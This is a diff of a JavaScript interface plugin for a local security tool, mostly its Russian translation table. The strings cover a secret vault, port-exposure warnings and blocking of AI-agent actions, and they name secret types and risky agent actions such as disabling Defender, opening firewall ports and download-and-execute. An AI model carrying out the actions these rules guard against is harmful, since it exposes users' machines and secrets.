@@ -6,800 +6,321 @@
   "use strict";
   if (!SDK || !SDK.React) return;
   const React = SDK.React;
-  // ---- i18n: Russian when the system/browser language is Russian (or Ukrainian/Belarusian) ----
+
+  // ---- i18n & Language Management ----
+  let currentLang = (function () {
+    try {
+      const saved = typeof localStorage !== "undefined" && localStorage ? localStorage.getItem("msg_lang") : null;
+      if (saved === "ru" || saved === "en") return saved;
+      const l = (typeof navigator !== "undefined" && ((navigator.languages && navigator.languages[0]) || navigator.language)) || "";
+      return /^(ru|uk|be)\b/i.test(l) ? "ru" : "en";
+    } catch (e) { return "en"; }
+  })();
+
+  const langListeners = new Set();
+  function setLanguage(lang) {
+    if (lang !== "ru" && lang !== "en") return;
+    currentLang = lang;
+    try { if (typeof localStorage !== "undefined" && localStorage) localStorage.setItem("msg_lang", lang); } catch (e) {}
+    try { post("/config", { lang: lang }).catch(function () {}); } catch (e) {}
+    langListeners.forEach(function (fn) { try { fn(lang); } catch (e) {} });
+  }
+
   /* I18N_RU_BEGIN */
   const I18N_RU = {
+    "Live protection": "Защита",
+    "live protection": "защита в реальном времени",
+    "Live protection (#)": "Защита (#)",
+    "Protection": "Защита",
+    "Ports": "Порты",
+    "Code Inspector": "Проверка кода",
+    "Vault": "Сейф",
+    "Settings": "Настройки",
+    "Exposure": "Порты",
+    "network exposure": "открытые порты",
+    "Exposure score ": "Оценка защищенности портов ",
+    "Port security score ": "Оценка защищенности портов ",
+    "Exposure score #/100": "Оценка защищенности портов #/100",
+    "Port security score #/100": "Оценка защищенности портов #/100",
+    "Exposure score 86/100": "Оценка защищенности портов 86/100",
+    "safe listeners": "безопасные",
+    " critical · ": " критичных · ",
+    " high · ": " высоких · ",
+    " medium · ": " средних · ",
+    " low": " низких",
+    "# actions blocked": "Заблокировано действий: #",
+    "# action blocked": "Заблокировано действие",
     "  An agent tried to send sensitive data. Decide below what should happen.": "  Агент пытался отправить важные данные. Решите ниже, что делать.",
     "  Every agent action is checked for secrets before it runs.": "  Каждое действие агента проверяется на секреты до запуска.",
-    " attempts": " попыток",
-    " critical · ": " критичных · ",
-    " d ago": " дн назад",
-    " h ago": " ч назад",
-    " high · ": " высоких · ",
-    " low": " низких",
-    " medium · ": " средних · ",
+    "Protected": "Защищено",
+    "Last check ": "Последняя проверка: ",
+    "Last check 0s ago": "Проверено только что",
+    "0s ago": "только что",
+    "just now": "только что",
+    "s ago": " с назад",
     " min ago": " мин назад",
-    " safe listeners": " безопасных",
-    " tried to: ": " пытался: ",
-    "# action blocked": "Заблокировано действие",
-    "# actions blocked": "Заблокировано действий: #",
-    "() on line": "() в строке",
-    "(group policy) or by other security software are not visible, so those show as 'not verified'.": "(групповая политика) или другим защитным ПО не видны, поэтому они отображаются как «не проверено».",
-    "(l.icon ? l.icon +": "(l.icon ? l.icon +",
-    "(l.reach ===": "(l.reach ===",
-    "(managed by your organisation)": "(управляется вашей организацией)",
-    "(pid": "(pid",
-    "(rule": "(правило",
-    "(showSafe ?": "(showSafe ?",
-    ") else": ") else",
-    ") if isinstance(paths, dict) else": ") if isinstance(paths, dict) else",
-    ")), str(getattr(body,": ")), str(getattr(body,",
-    ")), str(u.get(": ")), str(u.get(",
-    "))[:#] for k in (": "))[:#] for k in (",
-    "))[:#], str(getattr(body,": "))[:#], str(getattr(body,",
-    "))[:32], str(getattr(body,": "))[:32], str(getattr(body,",
-    "))[:80] for k in (": "))[:80] for k in (",
-    "), getattr(body,": "), getattr(body,",
-    ").lower() if origin else": ").lower() if origin else",
-    "+ (bad ?": "+ (bad ?",
-    "+ (items.length === # ?": "+ (items.length === # ?",
-    "+ (items.length === 1 ?": "+ (items.length === 1 ?",
-    "+ (l.severity ===": "+ (l.severity ===",
-    "+ (label === k[#] ?": "+ (label === k[#] ?",
-    "+ (label === k[0] ?": "+ (label === k[0] ?",
-    "+ (pending ?": "+ (pending ?",
-    "+ (pending.length > # ?": "+ (pending.length > # ?",
-    "+ (pending.length > 1 ?": "+ (pending.length > 1 ?",
-    "+ (pending.length ?": "+ (pending.length ?",
-    "+ (tab === id ?": "+ (tab === id ?",
-    "+ a.after.trim()),": "+ a.after.trim()),",
-    "+ a.before.trim()),": "+ a.before.trim()),",
-    "+ addrText(l) +": "+ addrText(l) +",
-    "+ ago(data.scanned_at))),": "+ ago(data.scanned_at))),",
-    "+ data.score +": "+ data.score +",
-    "+ f.path :": "+ f.path :",
-    "+ f.token.slice(#, #) +": "+ f.token.slice(#, #) +",
-    "+ f.token.slice(0, 24) +": "+ f.token.slice(0, 24) +",
-    "+ fwText(l)),": "+ fwText(l)),",
-    "+ inc.agent.session_id.slice(#, #) :": "+ inc.agent.session_id.slice(#, #) :",
-    "+ inc.agent.session_id.slice(0, 12) :": "+ inc.agent.session_id.slice(0, 12) :",
-    "+ inc.agent.task_id.slice(#, #) :": "+ inc.agent.task_id.slice(#, #) :",
-    "+ inc.agent.task_id.slice(0, 12) :": "+ inc.agent.task_id.slice(0, 12) :",
-    "+ inc.attempts +": "+ inc.attempts +",
-    "+ inc.process.pid +": "+ inc.process.pid +",
-    "+ l.firewall_rule +": "+ l.firewall_rule +",
-    "+ l.pid +": "+ l.pid +",
-    "+ l.port)),": "+ l.port)),",
-    "+ pending +": "+ pending +",
-    "+ pending.length +": "+ pending.length +",
-    "+ r.line),": "+ r.line),",
-    "+ r.lines +": "+ r.lines +",
-    "+ r.sink.human +": "+ r.sink.human +",
-    "+ r.token.slice(#, #) +": "+ r.token.slice(#, #) +",
-    "+ r.token.slice(0, 26) +": "+ r.token.slice(0, 26) +",
-    "+ s.line +": "+ s.line +",
-    "+ s.line); }),": "+ s.line); }),",
-    "+ s.wrapper +": "+ s.wrapper +",
-    ", #)[#].strip(": ", #)[#].strip(",
-    ", (name or": ", (имя или",
-    ", 1)[0].strip(": ", 1)[0].strip(",
-    ", Financial:": ", Финансы:",
-    ", Health:": ", Здоровье:",
-    ", Location:": ", Местоположение:",
-    ", PII:": ", Персональные данные:",
-    ", allowed:": ", разрешено:",
-    ", autoComplete:": ", autoComplete:",
-    ", blocked:": ", blocked:",
-    ", disabled: !!busy,": ", disabled: !!busy,",
-    ", disabled: !a.verified, onClick: p.onFix },": ", disabled: !a.verified, onClick: p.onFix },",
-    ", key:": ", key:",
-    ", key: i },": ", key: i },",
-    ", local_network:": ", local_network:",
-    ", message:": ", message:",
-    ", null,": ", null,",
-    ", null, l.service),": ", null, l.service),",
-    ", null, r.title),": ", null, r.title),",
-    ", null, who),": ", null, who),",
-    ", off:": ", off:",
-    ", onClick: openReport },": ", onClick: openReport },",
-    ", placeholder:": ", placeholder:",
-    ", protected:": ", защищено:",
-    ", role:": ", role:",
-    ", sandbox:": ", sandbox:",
-    ", spellCheck: false, placeholder:": ", spellCheck: false, placeholder:",
-    ", srcDoc: report, title:": ", srcDoc: report, title:",
-    ", this_computer:": ", this_computer:",
-    ", type:": ", type:",
-    ", value: code,": ", value: code,",
-    ", value: title,": ", value: title,",
-    ", { code: code, title: title })": ", { code: code, title: title })",
-    ", { incident: inc.id, choice: choice })": ", { incident: inc.id, choice: choice })",
-    ", { key: i }, g); })))),": ", { key: i }, g); })))),",
-    ", { key: k[#], type:": ", { key: k[#], type:",
-    ", { key: k[0], type:": ", { key: k[0], type:",
-    ", { secret: secret, label: label })": ", { secret: secret, label: label })",
-    ": inc.status ===": ": inc.status ===",
-    ": label === k[#],": ": label === k[#],",
-    ": label === k[0],": ": label === k[0],",
-    ": x; }).join(": ": x; }).join(",
-    "; }).join(": "; }).join(",
-    "A force push can erase other people's work and published history.": "Force push может стереть чужую работу и опубликованную историю.",
-    "A program is waiting for network connections.": "Программа ожидает сетевые подключения.",
-    "A secret from your vault": "Секрет из вашего хранилища",
-    "ASUS software will stop checking for updates automatically.": "Программное обеспечение ASUS перестанет автоматически проверять обновления.",
-    "ASUS update service": "Служба обновления ASUS",
-    "AWS access key ID": "Идентификатор ключа доступа AWS",
-    "AWS secret access key": "Секретный ключ доступа AWS",
-    "Add --bind #.#.#.#, and never run it in a folder with secrets.": "Добавьте --bind #.#.#.# и никогда не запускайте его в папке с секретами.",
-    "Add --bind 127.0.0.1, and never run it in a folder with secrets.": "Добавьте --bind 127.0.0.1 и никогда не запускайте его в папке с секретами.",
-    "Add a file": "Добавить файл",
-    "Add a secret you want to protect. It is encrypted with your Windows account": "Добавьте секрет, который хотите защитить. Он шифруется с помощью вашей учётной записи Windows",
-    "Add a secret you want to protect. It is encrypted with your Windows account ": "Добавьте секрет, который хотите защитить. Он шифруется с помощью вашей учётной записи Windows ",
-    "Advanced": "Дополнительно",
-    "Agent": "Агент",
+    " h ago": " ч назад",
+    " d ago": " дн назад",
+    " attempts": " попыток",
     "Agent ": "Агент ",
-    "All": "Все",
-    "All findings in one string. known_secrets: iterable of (value, label, title).": "Все находки в одной строке. known_secrets: итерируемый объект из (value, label, title).",
-    "Allow once": "Разрешить один раз",
-    "Allowed once": "Разрешено один раз",
-    "An agent tried to send sensitive data. Decide below what should happen.": "Агент попытался отправить конфиденциальные данные. Ниже решите, что должно произойти.",
-    "An open Docker API is full control of the machine.": "Открытый Docker API даёт полный контроль над компьютером.",
-    "An open Jupyter lets anyone run any code on this computer.": "Открытый Jupyter позволяет любому запускать любой код на этом компьютере.",
-    "An open Ray dashboard lets anyone run jobs on this machine.": "Открытая панель Ray позволяет любому запускать задачи на этой машине.",
-    "An open database is the classic SaaS data breach.": "Открытая база данных — классическая причина утечки данных в SaaS.",
-    "Anthropic API key": "API-ключ Anthropic",
-    "AnyDesk remote access": "Удалённый доступ AnyDesk",
-    "Anyone can run code on this computer.": "Любой может запускать код на этом компьютере.",
-    "Anyone on the network can use or delete your models.": "Любой в сети может использовать или удалить ваши модели.",
-    "Anyone on the network could run, pull or delete your local AI models.": "Любой в сети сможет запускать, загружать или удалять ваши локальные модели ИИ.",
-    "Anyone who can reach this port can run your models, read prompts and pull or delete models.": "Любой, кто получит доступ к этому порту, сможет запускать ваши модели, читать запросы, а также скачивать или удалять модели.",
-    "Apply fix to the code above": "Применить исправление к коду выше",
-    "Ask the agent to try again within # minutes. It will be allowed one time.": "Попросите агента повторить попытку в течение # минут. Она будет разрешена один раз.",
-    "Ask the agent to try again within 15 minutes. It will be allowed one time.": "Попросите агента повторить попытку в течение 15 минут. Она будет разрешена один раз.",
-    "Ask the agent to try again: the secret will be replaced with a vault token.": "Попросите агента повторить попытку: секрет будет заменён токеном хранилища.",
-    "Ask the user first; open only the exact port for the exact program.": "Сначала спросите пользователя; открывайте только нужный порт для нужной программы.",
-    "AsusUpdateCheck": "AsusUpdateCheck",
-    "Automatic": "Автоматически",
-    "Automatic fix": "Автоматическое исправление",
-    "B": "Б",
-    "BIP# word list failed its integrity check": "Список слов BIP# не прошёл проверку целостности",
-    "BIP# word list has the wrong size": "Список слов BIP# имеет неправильный размер",
-    "BIP39 word list failed its integrity check": "Список слов BIP39 не прошёл проверку целостности",
-    "BIP39 word list has the wrong size": "Список слов BIP39 имеет неправильный размер",
-    "Bank account (IBAN)": "Банковский счёт (IBAN)",
-    "Bearer token in an Authorization header": "Bearer-токен в заголовке Authorization",
-    "Bind it to #.#.#.# or block the port in the firewall.": "Привяжите её к #.#.#.# или заблокируйте порт в брандмауэре.",
-    "Bind it to 127.0.0.1 or block the port in the firewall.": "Привяжите её к 127.0.0.1 или заблокируйте порт в брандмауэре.",
-    "Bind to #.#.#.# and enable authentication.": "Привяжите к #.#.#.# и включите аутентификацию.",
-    "Bind to #.#.#.# and enable security.": "Привяжите к #.#.#.# и включите защиту.",
-    "Bind to #.#.#.# and set an admin password.": "Привяжите к #.#.#.# и задайте пароль администратора.",
-    "Bind to #.#.#.# or add authentication.": "Привяжите к #.#.#.# или добавьте аутентификацию.",
-    "Bind to #.#.#.# or enable auth.": "Привяжите к #.#.#.# или включите аутентификацию.",
-    "Bind to #.#.#.# or set an API key.": "Привяжите к #.#.#.# или задайте API-ключ.",
-    "Bind to #.#.#.# or stop it when not in use.": "Привяжите к #.#.#.# или останавливайте, когда не используется.",
-    "Bind to #.#.#.#.": "Привяжите к #.#.#.#.",
-    "Bind to 127.0.0.1 and enable authentication.": "Привяжите к 127.0.0.1 и включите аутентификацию.",
-    "Bind to 127.0.0.1 and enable security.": "Привяжите к 127.0.0.1 и включите защиту.",
-    "Bind to 127.0.0.1 and set an admin password.": "Привяжите к 127.0.0.1 и задайте пароль администратора.",
-    "Bind to 127.0.0.1 or add authentication.": "Привяжите к 127.0.0.1 или добавьте аутентификацию.",
-    "Bind to 127.0.0.1 or enable auth.": "Привяжите к 127.0.0.1 или включите аутентификацию.",
-    "Bind to 127.0.0.1 or set an API key.": "Привяжите к 127.0.0.1 или задайте API-ключ.",
-    "Bind to 127.0.0.1 or stop it when not in use.": "Привяжите к 127.0.0.1 или останавливайте, когда не используется.",
-    "Bind to 127.0.0.1.": "Привяжите к 127.0.0.1.",
-    "Bitcoin private key (WIF)": "Приватный ключ Bitcoin (WIF)",
-    "Block & quarantine": "Заблокировать и поместить в карантин",
-    "Block in firewall": "Заблокировать в брандмауэре",
-    "Block incoming connections to this port in Windows Firewall? Windows will ask you to confirm. You can undo it here.": "Заблокировать входящие подключения к этому порту в брандмауэре Windows? Windows попросит подтвердить. Отменить это можно здесь.",
-    "Block, or Allow once": "«Заблокировать» или «Разрешить один раз»",
-    "Blocked, secret quarantined": "Заблокировано, секрет в карантине",
-    "Blocked. Other devices can no longer connect to this port.": "Заблокировано. Другие устройства больше не могут подключаться к этому порту.",
-    "Cancel": "Отмена",
-    "Card or bank account": "Карта или банковский счёт",
-    "Cassandra": "Cassandra",
-    "Change kind": "Сменить тип",
-    "Changes made by Guard (": "Изменения, внесённые Guard (",
-    "Changes made by Guard (#)": "Изменения, сделанные Guard (#)",
-    "Changes what the internet can reach on this computer.": "Меняет то, что доступно из интернета на этом компьютере.",
-    "Check again": "Проверить снова",
-    "Check code": "Проверка кода",
-    "Checking…": "Проверка…",
-    "Choose a file first.": "Сначала выберите файл.",
-    "Choose what kind of data this is.": "Выберите, что это за данные.",
-    "Chroma stores your documents and has no auth by default.": "Chroma хранит ваши документы, и по умолчанию в ней нет аутентификации.",
-    "Chroma vector database": "Векторная база данных Chroma",
-    "Close report": "Закрыть отчет",
-    "Cloudflare tunnel": "Туннель Cloudflare",
-    "CodeBody": "CodeBody",
-    "Collections of your data, no auth by default.": "Коллекции ваших данных, без аутентификации по умолчанию.",
-    "Connected Devices Platform": "Платформа подключённых устройств",
-    "CouchDB": "CouchDB",
-    "Could not do it.": "Не получилось.",
-    "Could not reach the Guard backend.": "Не удалось связаться с сервером Guard.",
-    "Could not save the decision.": "Не удалось сохранить решение.",
-    "Could not save.": "Не удалось сохранить.",
-    "Could not show the value.": "Не удалось показать значение.",
-    "Credentials": "Учётные данные",
-    "Critical": "Критический",
-    "Crypto private key (hex)": "Приватный ключ криптокошелька (hex)",
-    "Crypto wallet seed phrase (BIP#)": "Сид-фраза криптокошелька (BIP#)",
-    "Crypto wallet seed phrase (BIP39)": "Сид-фраза криптокошелька (BIP39)",
-    "DROP / TRUNCATE / DELETE without WHERE removes data permanently.": "DROP / TRUNCATE / DELETE без WHERE удаляет данные безвозвратно.",
-    "Dashboards may expose data or admin panels.": "Панели могут открывать доступ к данным или админ-панелям.",
-    "Database reachable from the network.": "База данных доступна из сети.",
-    "DecisionBody": "DecisionBody",
+    "session ": "сеанс ",
+    "an agent": "агент",
+    "vault · your secrets, encrypted": "сейф · ваши секреты, зашифрованы",
+    "Add a file": "Добавить файл",
+    "Up to 10 MB: .env, keys, wallet files, documents.": "До 10 МБ: .env, ключи, файлы кошельков, документы.",
+    "Protected: #": "Под защитой: #",
+    "Protected: ": "Под защитой: ",
+    "Trash (": "Корзина (",
+    "Trash (#)": "Корзина (#)",
+    "Restore": "Восстановить",
+    "Restored.": "Восстановлено.",
     "Delete forever": "Удалить навсегда",
     "Delete forever? This cannot be undone.": "Удалить навсегда? Это нельзя отменить.",
-    "Delete only an exact path the user named, and prefer moving to a trash folder.": "Удаляйте только точный путь, указанный пользователем, и лучше перемещайте в корзину.",
     "Deleted forever.": "Удалено навсегда.",
-    "Deletes files recursively": "Рекурсивно удаляет файлы",
-    "Destroys database data": "Уничтожает данные базы данных",
-    "Dev servers usually have no auth and may have debug mode.": "Серверы разработки обычно не имеют аутентификации и могут работать в режиме отладки.",
-    "Disable NetBIOS over TCP/IP if unused.": "Отключите NetBIOS over TCP/IP, если не используете.",
-    "Disable Telnet.": "Отключите Telnet.",
-    "Disable or restrict to admins.": "Отключите или разрешите только администраторам.",
-    "Disabling Defender removes protection against malware.": "Отключение Defender снимает защиту от вредоносных программ.",
-    "Do not let an agent change antivirus settings.": "Не позволяйте агенту менять настройки антивируса.",
-    "Do not retry until the user has decided, and never try to work around this block.": "Не повторяйте попытку, пока пользователь не принял решение, и никогда не пытайтесь обойти эту блокировку.",
-    "Docker API without TLS": "Docker API без TLS",
-    "Download the script first, read it, then run it.": "Сначала сохраните файл на диск, проверьте его и только потом запускайте.",
-    "Downloading and executing code in one step runs whatever the server sends, with your permissions.": "Скачивание и запуск кода одним действием выполняет всё, что пришлёт сервер, с вашими правами.",
-    "E.Listener": "E.Listener",
-    "Elasticsearch / OpenSearch": "Elasticsearch / OpenSearch",
-    "Email address": "Адрес электронной почты",
-    "Enable 2-factor login.": "Включите двухфакторную аутентификацию.",
-    "Enables Remote Desktop": "Включает удалённый рабочий стол",
-    "Encrypted crypto wallet file (keystore / vault)": "Зашифрованный файл криптокошелька (keystore / vault)",
-    "Encrypting…": "Шифрование…",
-    "Enter the new value (limit # KB).": "Введите новое значение (лимит # КБ).",
-    "Enter the new value (limit 4 KB).": "Введите новое значение (лимит 4 КБ).",
-    "Enter the secret value.": "Введите значение секрета.",
-    "Every agent action is checked for secrets before it runs.": "Каждое действие агента проверяется на наличие секретов перед запуском.",
-    "Everything runs on this computer. Secret values are never shown or sent.": "Всё работает на этом компьютере. Секреты никогда не показываются и не отправляются.",
-    "Exposes Ollama to the network": "Открывает Ollama для сети",
-    "Exposes all documents.": "Открывает доступ ко всем документам.",
-    "Exposes your local models to the network without authentication.": "Открывает доступ к вашим локальным моделям по сети без пароля.",
-    "Exposure": "Порты",
-    "Exposure score": "Оценка доступности",
-    "Exposure score ": "Оценка экспозиции ",
-    "Exposure score #/#": "Оценка открытости #/#",
-    "Exposure score #/100": "Оценка открытости #/100",
-    "Extended private key (HD wallet master key)": "Расширенный приватный ключ (мастер-ключ HD-кошелька)",
-    "FDResPub": "FDResPub",
-    "File encrypted and saved. Agents cannot send its contents.": "Файл зашифрован и сохранён. Агенты не смогут отправить его содержимое.",
-    "FileBody": "FileBody",
-    "Financial": "Финансовые",
-    "Fine inside a trusted home network; dangerous if forwarded to the internet.": "Нормально в доверенной домашней сети; опасно, если открыт доступ из интернета.",
-    "Firewall verdicts come from the local Windows Firewall rules. Rules set by a company": "Вердикты брандмауэра основаны на локальных правилах брандмауэра Windows. Правила, заданные компанией",
-    "Firewall verdicts come from the local Windows Firewall rules. Rules set by a company (group policy) or by other security software are not visible, so those show as 'not verified'.": "Вердикты брандмауэра основаны на локальных правилах брандмауэра Windows. Правила, заданные компанией (групповая политика) или другим защитным ПО не видны, поэтому они отображаются как «не проверено».",
-    "Full report": "Полный отчет",
-    "Game streaming and LAN discovery.": "Потоковая передача игр и обнаружение в LAN.",
-    "GitHub access token": "Токен доступа GitHub",
-    "GitLab access token": "Токен доступа GitLab",
-    "Google API key": "API-ключ Google",
-    "Gradio app (AI demos, Stable Diffusion)": "Приложение Gradio (ИИ-демо, Stable Diffusion)",
-    "Gradio apps run models and file uploads, usually without a password.": "Приложения Gradio запускают модели и принимают загрузку файлов, обычно без пароля.",
-    "Guard backend is not reachable.": "Бэкенд Guard недоступен.",
-    "Guard proves where sensitive data can leak, before the code ever runs.": "Guard показывает, куда могут утечь конфиденциальные данные, ещё до запуска кода.",
-    "Health": "Здоровье",
-    "Hide": "Скрыть",
-    "Hide ": "Скрыть ",
-    "High": "Высокий",
-    "Hold to show the full value": "Удерживайте, чтобы увидеть значение целиком",
-    "Honest limits of this check": "Честные ограничения этой проверки",
-    "Honest limits of this scan": "Честные ограничения этого сканирования",
-    "How to send it legally": "Как отправить это легально",
-    "I know this, it is fine": "Я знаю это, всё в порядке",
-    "If you do not recognise this program, stop it or block it in the firewall.": "Если вы не узнаёте эту программу, остановите её или заблокируйте в брандмауэре.",
-    "If you never print to or from other computers, disable the Print Spooler service.": "Если вы никогда не печатаете на другие компьютеры или с них, отключите службу печати.",
-    "If you turn it off:": "Если отключить:",
-    "If you turn it off: ": "Если отключить его: ",
-    "In LM Studio: Server settings, turn off 'Serve on Local Network'.": "В LM Studio: в настройках сервера отключите «Serve on Local Network».",
-    "Incident not found.": "Инцидент не найден.",
-    "It cannot see port forwarding on your router. Make sure the router forwards no ports you do not need.": "Оно не видит переадресацию портов на вашем маршрутизаторе. Убедитесь, что маршрутизатор не пересылает ненужные вам порты.",
-    "It does not test from the internet. An external check sends your IP address to an outside service,": "Оно не тестирует из интернета. Внешняя проверка отправляет ваш IP-адрес во внешний сервис,",
-    "It does not test from the internet. An external check sends your IP address to an outside service, so it is only done when you ask for it.": "Оно не тестирует из интернета. Внешняя проверка отправляет ваш IP-адрес во внешний сервис, поэтому это выполняется только по вашему запросу.",
-    "Items in the trash are deleted for good after # days. While in the trash, agents cannot use them.": "Через # дней корзина очищается навсегда. Пока запись в корзине, агенты не могут ею пользоваться.",
-    "Items in the trash are deleted for good after 30 days. While in the trash, agents cannot use them.": "Через 30 дней корзина очищается навсегда. Пока запись в корзине, агенты не могут ею пользоваться.",
-    "JSON Web Token": "JSON Web Token",
-    "Jupyter": "Jupyter",
-    "Jupyter Notebook": "Jupyter Notebook",
-    "KB": "КБ",
-    "Keep ASUS software updated, or disable the service if you do not need it.": "Обновляйте ПО ASUS или отключите службу, если она не нужна.",
-    "Keep OLLAMA_HOST=#.#.#.#.": "Оставьте OLLAMA_HOST=#.#.#.#.",
-    "Keep OLLAMA_HOST=127.0.0.1.": "Оставьте OLLAMA_HOST=127.0.0.1.",
-    "Keep the action blocked": "Оставить действие заблокированным",
-    "Keep the action blocked and store the secret encrypted": "Оставить действие заблокированным и сохранить секрет в зашифрованном виде",
-    "Kind changed.": "Тип изменён.",
-    "Kind of secret": "Тип секрета",
-    "LM Studio": "LM Studio",
-    "LM Studio server": "Сервер LM Studio",
-    "LanmanServer": "LanmanServer",
-    "Last check": "Последняя проверка",
-    "Last check ": "Последняя проверка ",
-    "Launch with server_name='#.#.#.#' or set auth.": "Запустите с server_name='#.#.#.#' или включите авторизацию.",
-    "Launch with server_name='127.0.0.1' or set auth.": "Запустите с server_name='127.0.0.1' или включите авторизацию.",
-    "Leaks cached data and can be abused for DDoS.": "Раскрывает кэшированные данные и может использоваться для DDoS.",
-    "Legacy file sharing.": "Устаревший общий доступ к файлам.",
-    "Let this exact action run one time (expires in # minutes)": "Разрешить это действие один раз (истечёт через # минут)",
-    "Let this exact action run one time (expires in 15 minutes)": "Разрешить это действие один раз (истечёт через 15 минут)",
-    "Lets Windows talk to your phone and other devices nearby.": "Позволяет Windows общаться с вашим телефоном и другими устройствами рядом.",
-    "Live protection": "Защита",
-    "Live protection (#)": "Защита (#)",
-    "Load example": "Загрузить пример",
-    "Local models exposed to the network.": "Локальные модели открыты для сети.",
-    "Location": "Местоположение",
-    "Location data": "Данные о местоположении",
-    "Low": "Низкий",
-    "MB": "МБ",
-    "Make sure the tunnel requires a Cloudflare Access login.": "Убедитесь, что туннель требует вход через Cloudflare Access.",
-    "Manual": "Вручную",
-    "Marked as trusted. It no longer lowers your score.": "Отмечено как доверенное. Больше не снижает вашу оценку.",
-    "Medical data": "Медицинские данные",
-    "Medium": "Средний",
-    "Memcached": "Memcached",
-    "Microsoft SQL Server": "Microsoft SQL Server",
-    "Microsoft.NetworkAndSharingCenter": "Microsoft.NetworkAndSharingCenter",
-    "Milvus vector database": "Векторная база данных Milvus",
-    "Model and agent APIs are often started without authentication.": "API моделей и агентов часто запускаются без защиты.",
-    "MongoDB database": "База данных MongoDB",
+    "file": "файл",
+    "text": "текст",
+    "New name": "Новое название",
+    "New value": "Новое значение",
+    "Save": "Сохранить",
+    "Cancel": "Отмена",
+    "Rename": "Переименовать",
+    "Renamed.": "Переименовано.",
+    "Change kind": "Сменить категорию",
+    "Kind changed.": "Категория изменена.",
+    "Replace value": "Заменить значение",
+    "Value replaced. Agents keep the same token.": "Значение заменено. Токен для агентов прежний.",
+    "Save a copy to Downloads": "Сохранить копию в «Загрузки»",
+    "Saved a copy to Downloads.": "Копия сохранена в «Загрузки».",
     "Move to trash": "В корзину",
     "Move to trash? You can restore it later.": "В корзину? Его можно восстановить позже.",
     "Moved to the trash.": "Перемещено в корзину.",
-    "Moved to the trash. You can restore it.": "Перемещено в корзину. Можно восстановить.",
-    "MySQL / MariaDB database": "База данных MySQL / MariaDB",
-    "MySQL database": "База данных MySQL",
-    "Name (optional), e.g. payment agent": "Название (необязательно), например «платёжный агент»",
-    "NetBIOS file sharing": "Общий доступ к файлам NetBIOS",
-    "Network discovery / app traffic (UDP)": "Сетевое обнаружение / трафик приложений (UDP)",
-    "Never expose port #.": "Никогда не открывайте порт #.",
-    "Never expose port 2375.": "Никогда не открывайте порт 2375.",
-    "Never forward port # on the router. Turn off sharing on public Wi-Fi.": "Никогда не пробрасывайте порт # на роутере. Отключайте общий доступ в публичных Wi-Fi сетях.",
-    "Never forward port 445 on the router. Turn off sharing on public Wi-Fi.": "Никогда не пробрасывайте порт 445 на роутере. Отключайте общий доступ в публичных Wi-Fi сетях.",
-    "New name": "Новое название",
-    "New value": "Новое значение",
-    "No decided incidents yet.": "Решённых инцидентов пока нет.",
-    "No incidents yet": "Инцидентов пока нет",
-    "No incidents yet.": "Инцидентов пока нет.",
-    "No safe automatic fix for this leak. Use one of the protections above.": "Нет безопасного автоматического исправления для этой утечки. Используйте одну из защит выше.",
-    "Normal for Steam. Nothing to do.": "Нормально для Steam. Ничего делать не нужно.",
-    "Nothing risky is open to the network.": "Ничего рискованного не открыто для сети.",
-    "Nothing to do.": "Ничего делать не нужно.",
-    "Nothing to undo.": "Нечего отменять.",
-    "Often an AI chat UI or llama.cpp server without a password.": "Обычно это чат с ИИ или сервер llama.cpp без пароля.",
-    "Often unencrypted or weakly protected.": "Часто без шифрования или со слабой защитой.",
-    "Ollama (local AI models)": "Ollama (локальные ИИ-модели)",
-    "One of the most common sources of leaked records.": "Один из самых частых источников утечек записей.",
-    "Only Windows is supported.": "Поддерживается только Windows.",
-    "Only open a tunnel you started yourself, with a password, and close it after use.": "Открывайте туннель, только если запустили его сами и он защищён паролем, и закрывайте после использования.",
-    "Only programs on this computer can connect. This is the safe setting.": "Подключаться могут только программы на этом компьютере. Это безопасный параметр.",
-    "Only this computer": "Только этот компьютер",
-    "Open Delivery Optimization settings": "Открыть настройки Delivery Optimization",
-    "Open MongoDB servers are routinely wiped and held for ransom.": "Открытые серверы MongoDB часто стирают и требуют выкуп.",
-    "Open Redis allows reading all data and often running code.": "Открытый Redis позволяет читать все данные и часто выполнять код.",
-    "Open Redis.": "Открытый Redis.",
-    "Open Windows Firewall": "Открыть брандмауэр Windows",
-    "Open Windows services": "Открыть службы Windows",
-    "Open database.": "Открытая база данных.",
-    "Open full report": "Открыть полный отчёт",
-    "Open settings": "Открыть настройки",
-    "Open sharing settings": "Открыть настройки общего доступа",
-    "Open to every network": "Открыто для любой сети",
-    "Open to this local network": "Открыто для этой локальной сети",
-    "OpenAI API key": "API-ключ OpenAI",
-    "Opened Windows settings.": "Открыты настройки Windows.",
-    "Opened the program's folder.": "Открыта папка программы.",
-    "Opens a port in the firewall or turns the firewall off": "Открывает порт в брандмауэре или отключает брандмауэр",
-    "Opens a public internet tunnel": "Открывает публичный интернет-туннель",
-    "Optional: Settings, Windows Update, Delivery Optimization, turn off downloads from other PCs.": "Необязательно: Параметры, Центр обновления Windows, Оптимизация доставки, отключите загрузку с других ПК.",
-    "Other computers will no longer open shared folders or printers on this PC.": "Другие компьютеры больше не смогут открывать общие папки или принтеры на этом ПК.",
-    "Other computers will not see this PC in the Network folder.": "Другие компьютеры не увидят этот ПК в папке «Сеть».",
-    "Overwrites git history on the server": "Перезаписывает историю git на сервере",
-    "Password inside a URL": "Пароль внутри URL",
-    "Password, API key or token": "Пароль, API-ключ или токен",
-    "Paste YadroLang code here": "Вставьте сюда код на YadroLang",
-    "Paste a program written in YadroLang (English or Russian keywords).": "Вставьте программу на YadroLang (ключевые слова на английском или русском).",
-    "Paste a program written in YadroLang (English or Russian keywords). ": "Вставьте программу на YadroLang (ключевые слова — английские или русские). ",
-    "Paste some code first.": "Сначала вставьте код.",
-    "Paste the secret value": "Вставьте значение секрета",
-    "Payment card number": "Номер платёжной карты",
-    "Personal data (name, phone, email)": "Персональные данные (имя, телефон, эл. почта)",
-    "Possible crypto seed phrase": "Возможная сид-фраза криптокошелька",
-    "PostgreSQL database": "База данных PostgreSQL",
-    "PowerShell remoting to this PC will stop working.": "Удалённое управление PowerShell на этом ПК перестанет работать.",
-    "Printer sharing service. It has had serious remote bugs (PrintNightmare).": "Служба общего доступа к принтерам. В ней были серьёзные удалённые уязвимости (PrintNightmare).",
-    "Private key (PEM)": "Приватный ключ (PEM)",
-    "Process:": "Процесс:",
-    "Process: ": "Процесс: ",
-    "Programs on this computer that accept network connections, and who can reach them. Nothing is changed by this scan.": "Программы на этом компьютере, которые принимают сетевые подключения, и кто может до них добраться. Этот скан ничего не меняет.",
-    "Protect & send": "Защитить и отправить",
